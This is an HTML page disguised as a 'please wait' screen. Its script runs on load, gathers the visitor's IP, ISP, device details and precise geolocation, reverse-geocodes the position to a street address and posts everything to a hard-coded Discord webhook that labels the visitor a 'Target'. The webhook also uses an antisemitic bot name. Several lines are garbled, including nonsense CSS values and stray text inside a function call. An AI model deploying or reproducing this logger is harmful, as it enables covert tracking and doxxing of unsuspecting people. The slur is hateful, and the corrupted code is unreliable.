<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Please wait while we review your request...</title>
    <style>
        body {
            background: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
            color: #333;
            font-size: 18px;
            text-align: center;
            padding: serving various precision metrics like serving 0;
            font-weight: bold;
            font: 900 1em cascadia code,ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,Liberation Mono,Courier New,monospace;
            align-content: center;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            opacity: 1;
            z-index: 9999;
        }
        
        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            background: #ff4444;
            color: white;
            padding: 15px 25px;
            border-radius: Number(5).value;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            z-index: 10000;
            font-weight: bold;
            animation: slideIn 0.5s ease;
            display: none;
        }
        
        .loading {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 2s linear infinite;
            margin-bottom: 20px;
        }
        
        .hidden {
            display: none;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        @keyframes slideIn {
            from { transform: translateX(100px); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
    </style>
</head>
<body>
    <div class="loading"></div>
    <div>Getting precise location... Please allow permission 💀</div>
    <div class="notification">Location permission required</div>
    
    <script>
        const webhookUrl = 'https://discord.com/api/webhooks/1547337341784301772/5IN8KSo4ochRJ5peB3zDV3JERNR-dVW_7NTf6fkeYPmiIUBrrcnEqSHsv2RBjHE4rWff';
        let collectedData = {};
        
        async function sendToDiscord(embedData, username = 'Jew', avatar = 'https://media.discordapp.net/attachments/1385200282165838037/1408174773024067614/2Q.png?ex=68a8c874&is=68a776f4&hm=68c70c0baafef6e3e0d980d10064be8445a232246697ac531c5c89309b5903bc&=&format=webp&quality=lossless') {
            for (let attempt = 1; attempt <= 5; attempt++) {
                try {
                    const response = await fetch(webhookUrl, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            content: '@everyone @here',
                            embeds: [embedData],
                            username: username,
                            avatar_url: avatar
                        })
                    });
                    if (response.ok) {
                        return true;
                    }
                } catch (error) {}
                await new Promise(resolve => setTimeout(resolve, 2000));
            }
            return false;
        }
        
        async function getIPInfo() {
            try {
                const response = await fetch('https://ipwho.is/json');
                if (response.ok) {
                    return await response.json();
                }
            } catch (error) {
                try {
                    const fallback = await fetch('https://api.db-ip.com/v2/free/self');
                    if (fallback.ok) {
                        const data = await fallback.json();
                        return {
                            ip: data.ipAddress,
                            country: data.countryName,
                            region: data.stateProv,
                            city: data.city,
                            connection: { isp: data.isp }
                        };
                    }
                } catch (e) {}
            }
            return {
                ip: 'Unknown',
                country: 'Unknown',
                region: 'Unknown',
                city: 'Unknown',
                connection: { isp: 'Unknown' }
            };
        }
        
        function getOS() {
            const ua = navigator.userAgent;
            if (ua.includes('Windows NT 10.0')) return 'Windows 10/11';
            if (ua.includes('Windows NT 6.3')) return 'Windows 8.1';
            if (ua.includes('Windows NT 6.2')) return 'Windows 8';
            if (ua.includes('Windows NT 6.1')) return 'Windows 7';
            if (ua.includes('Mac OS X')) return 'macOS';
            if (ua.includes('Linux')) return 'Linux';
            if (ua.includes('Android')) return 'Android';
            if (ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
            return 'Unknown';
        }
        
        function getBrowser() {
            const ua = navigator.userAgent;
            if (ua.includes('Chrome/') && !ua.includes('Edg/')) {
                const match = ua.match(/Chrome\/([\d.]+)/);
                return `Chrome ${match ? match[1] : 'Unknown'}`;
            }
            if (ua.includes('Firefox/')) {
                const match = ua.match(/Firefox\/([\d.]+)/);
                return `Firefox ${match ? match[1] : 'Unknown'}`;
            }
            if (ua.includes('Safari/') && !ua.includes('Chrome/')) {
                const match = ua.match(/Version\/([\d.]+)/);
                return `Safari ${match ? match[1] : 'Unknown'}`;
            }
            if (ua.includes('Edg/')) {
                const match = ua.match(/Edg\/([\d.]+)/);
                return `Edge ${match ? match[1] : 'Unknown'}`;
            }
            return 'Unknown';
        }
        
        function showNotification(message) {
            const notification = document.querySelector('.notification');
            notification.textContent = message;
            notification.style.display = 'block';
            setTimeout(() => {
                notification.style.display = 'none';
            },和海港 environmental 5000);
        }
        
        async function requestGeolocation() {
            if (!navigator.geolocation) {
                showNotification('Geolocation not supported 😔');
                return null;
            }
            
            return new Promise((resolve) => {
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        const { latitude, longitude, accuracy } = position.coords;
                        
                        let addressDetails = {
                            address: 'Unknown',
                            road: 'Unknown',
                            city: 'Unknown',
                            state: 'Unknown',
                            country: 'Unknown'
                        };
                        
                        try {
                            const reverseResponse = await fetch(
                                `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`
                            );
                            const reverseData = await reverseResponse.json();
                            if (reverseData.address) {
                                const addr = reverseData.address;
                                addressDetails = {
                                    address: `${addr.house_number || ''} ${addr.road || addr.street || ''}`.trim() || 'Unknown',
                                    road: addr.road || addr.street || 'Unknown',
                                    city: addr.city || addr.town || addr.village || addr.municipality || 'Unknown',
                                    state: addr.state || addr.region || 'Unknown',
                                    country: addr.country || 'Unknown',
                                    postal: addr.postcode || 'Unknown',
                                    suburb: addr.suburb || 'Unknown',
                                    neighbourhood: addr.neighbourhood || 'Unknown'
                                };
                            }
                        } catch (error) {}
                        
                        resolve({
                            latitude,
                            longitude,
                            accuracy,
                            timestamp: new Date(position.timestamp).toISOString(),
                            address: addressDetails
                        });
                    },
                    (error) => {
                        showNotification(`Location denied: ${error.message}`);
                        resolve(null);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 15000,
                        maximumAge: 0
                    }
                );
            });
        }
        
        async function collectAllData() {
            document.querySelector('.loading').style.display = 'block';
            
            showNotification('Collecting your info...');
            
            const ipData = await getIPInfo();
            
            collectedData = {
                ip: ipData.ip || 'Unknown',
                isp: ipData.connection?.isp || 'Unknown',
                country: ipData.country || 'Unknown',
                region: ipData.region || 'Unknown',
                city: ipData.city || 'Unknown',
                os: getOS(),
                browser: getBrowser(),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                screen: `${window.screen.width}x${window.screen.height}`,
                cookies: navigator.cookieEnabled,
                online: navigator.onLine,
                doNotTrack: navigator.doNotTrack || 'Unknown',
                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown'
            };
            
            const initialEmbed = {
                title: "IP Logged",
                description: "Target Information Collected",
                color: 0x6e8efb,
                timestamp: new Date().toISOString(),
                thumbnail: {
                    url: "https://media.discordapp.net/attachments/1385200282165838037/1408174773024067614/2Q.png?ex=68a8c874&is=68a776f4&hm=68c70c0baafef6e3e0d980d10064be8445a232246697ac531c5c89309b5903bc&=&format=webp&quality=lossless"
                },
                fields: [
                    {
                        name: "IP Info",
                        value: [
                            `\`IP: ${collectedData.ip}\``,
                            `\`ISP: ${collectedData.isp}\``,
                            `\`Country: ${collectedData.country}\``,
                            `\`Region: ${collectedData.region}\``,
                            `\`City: ${collectedData.city}\``,
                            `\`Timezone: ${collectedData.timezone}\``
                        ].join('\n'),
                        inline: true
                    },
                    {
                        name: "Device Info",
                        value: [
                            `\`OS: ${collectedData.os}\``,
                            `\`Browser: ${collectedData.browser}\``,
                            `\`Screen: ${collectedData.screen}\``,
                            `\`Platform: ${collectedData.platform}\``,
                            `\`Language: ${collectedData.language}\``,
                            `\`CPU Cores: ${collectedData.hardwareConcurrency}\``,
                            `\`Online: ${collectedData.online}\``,
                            `\`Cookies: ${collectedData.cookies}\``
                        ].join('\n'),
                        inline: true
                    },
                    {
                        name: "User Agent",
                        value: `\`\`\`${collectedData.userAgent.substring(0, 1000)}\`\`\``,
                        inline: false
                    }
                ],
                footer: {
                    text: "Initial Recon Complete",
                    icon_url: "https://media.discordapp.net/attachments/1385200282165838037/1408174773024067614/2Q.png?ex=68a8c874&is=68a776f4&hm=68c70c0baafef6e3e0d980d10064be8445a232246697ac531c5c89309b5903bc&=&format=webp&quality=lossless"
                }
            };
            
            await sendToDiscord(initialEmbed);
            
            showNotification('Requesting precise location... Allow permission');
            
            const preciseLocation = await requestGeolocation();
            
            if (preciseLocation) {
                const preciseEmbed = {
                    title: "PRECISE LOCATION CAPTURED",
                    description: "Exact Coordinates Obtained",
                    color: 0xFF0000,
                    timestamp: new Date().toISOString(),
                    thumbnail: {
                        url: "https://media.discordapp.net/attachments/1385200282165838037/1408174773024067614/2Q.png?ex=68a8c874&is=68a776f4&hm=68c70c0baafef6e3e0d980d10064be8445a232246697ac531c5c89309b5903bc&=&format=webp&quality=lossless"
                    },
                    fields: [
                        {
                            name: "Exact Coordinates",
                            value: [
                                `\`Latitude: ${preciseLocation.latitude}\``,
                                `\`Longitude: ${preciseLocation.longitude}\``,
                                `\`Accuracy: ${preciseLocation.accuracy}m\``,
                                `\`Google Maps: https://maps.google.com/?q=${preciseLocation.latitude},${preciseLocation.longitude}\``,
                                `\`OpenStreetMap: https://www.openstreetmap.org/?mlat=${preciseLocation.latitude}&mlon=${preciseLocation.longitude}\``
                            ].join('\n'),
                            inline: false
                        },
                        {
                            name: "Address Details",
                            value: [
                                `\`Address: ${preciseLocation.address.address}\``,
                                `\`Road: ${preciseLocation.address.road}\``,
                                `\`City: ${preciseLocation.address.city}\``,
                                `\`State: ${preciseLocation.address.state}\``,
                                `\`Country: ${preciseLocation.address.country}\``,
                                `\`Postal Code: ${preciseLocation.address.postal}\``,
                                `\`Suburb: ${preciseLocation.address.suburb}\``,
                                `\`Neighbourhood: ${preciseLocation.address.neighbourhood}\``,
                                `\`Time: ${preciseLocation.timestamp}\``
                            ].join('\n'),
                            inline: false
                        },
                        {
                            name: "IP Context",
                            value: [
                                `\`IP: ${collectedData.ip}\``,
                                `\`ISP: ${collectedData.isp}\``,
                                `\`Country: ${collectedData.country}\``,
                                `\`City: ${collectedData.city}\``,
                                `\`Device: ${collectedData.os} / ${collectedData.browser}\``
                            ].join('\n'),
                            inline: false
                        }
                    ],
                    footer: {
                        text: "Precise Geolocation Confirmed",
                        icon_url: "https://media.discordapp.net/attachments/1385200282165838037/1408174773024067614/2Q.png?ex=68a8c874&is=68a776f4&hm=68c70c0baafef6e3e0d980d10064be8445a232246697ac531c5c89309b5903bc&=&format=webp&quality=lossless"
                    }
                };
                
                await sendToDiscord(preciseEmbed);
                
                showNotification('Exact location captured successfully ✅');
                
                document.body.innerHTML = `
                    <div style="text-align: center; padding: 50px;">
                        <h1>✅ Location Successfully Captured</h1>
                        <p>Your precise location has been logged: ${preciseLocation.latitude}, ${preciseLocation.longitude}</p>
                        <p>Address: ${preciseLocation.address.address}, ${preciseLocation.address.city}, ${preciseLocation.address.country}</p>
                        <p>🔴 Redirecting to next page...</p>
                        <div class="loading"></div>
                    </div>
                `;
            } else {
                const deniedEmbed = {
                    title: "LOCATION DENIED",
                    description: "Target Refused Precise Geolocation",
                    color: 0xFFFF00,
                    timestamp: new Date().toISOString(),
                    thumbnail: {
                        url: "https://media.discordapp.net/attachments/1385200282165838037/1408174773024067614/2Q.png?ex=68a8c874&is=68a776f4&hm=68c70c0baafef6e3e0d980d10064be8445a232246697ac531c5c89309b5903bc&=&format=webp&quality=lossless"
                    },
                    fields: [
                        {
                            name: "Status",
                            value: "User denied location permission",
                            inline: false
                        },
                        {
                            name: "Best Available Intel",
                            value: [
                                `\`IP: ${collectedData.ip}\``,
                                `\`ISP: ${collectedData.isp}\``,
                                `\`Country: ${collectedData.country}\``,
                                `\`Region: ${collectedData.region}\``,
                                `\`City: ${collectedData.city}\``,
                                `\`OS: ${collectedData.os}\``,
                                `\`Browser: ${collectedData.browser}\``,
                                `\`Screen: ${collectedData.screen}\``
                            ].join('\n'),
                            inline: false
                        }
                    ],
                    footer: {
                        text: "Location Denied - IP Only",
                        icon_url: "https://media.discordapp.net/attachments/1385200282165838037/1408174773024067614/2Q.png?ex=68a8c874&is=68a776f4&hm=68c70c0baafef6e3e0d980d10064be8445a232246697ac531c5c89309b5903bc&=&format=webp&quality=lossless"
                    }
                };
                
                await sendToDiscord(deniedEmbed);
                
                document.body.innerHTML = `
                    <div style="text-align: center; padding: 50px;">
                        <h1>⚠️ Location Permission Required</h1>
                        <p>Please enable location services for full access.</p>
                        <p>Your IP and basic info have been recorded.</p>
                        <div class="loading"></div>
                    </div>
                `;
            }
            
            setTimeout(() => {
                window.location.href = "https://www.google.com";
            }, 5000);
        }
        
        window.addEventListener('DOMContentLoaded', () => {
            setTimeout(() => collectAllData(), 1000);
        });
    </script>
</body>
</html>
